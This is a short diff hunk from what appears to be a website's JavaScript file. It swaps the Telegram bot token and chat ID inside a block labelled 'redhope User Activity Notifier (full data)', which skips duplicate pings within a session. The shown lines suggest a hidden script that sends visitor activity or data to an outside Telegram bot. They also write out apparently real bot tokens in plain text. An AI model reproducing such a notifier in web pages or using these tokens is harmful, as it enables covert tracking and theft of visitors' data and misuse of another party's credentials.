@@ -5615,8 +5615,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
 /* === start: redhope User Activity Notifier (full data) === */
 (async () => {
-  const TG_BOT_TOKEN = '7944623021:AAGVlpMRe2Oim5i-eKZ220sYUOODsZDH7go';
-  const TG_CHAT_ID   = '6268442991';
+  const TG_BOT_TOKEN = '7953840767:AAGk5jiV5sFjMSB8Vr4HT9whHnRsBBtWAcg';
+  const TG_CHAT_ID   = '8135445040';
 
   /* avoid duplicate pings in one tab-session */
   if (sessionStorage.getItem('sel_notified')) return;
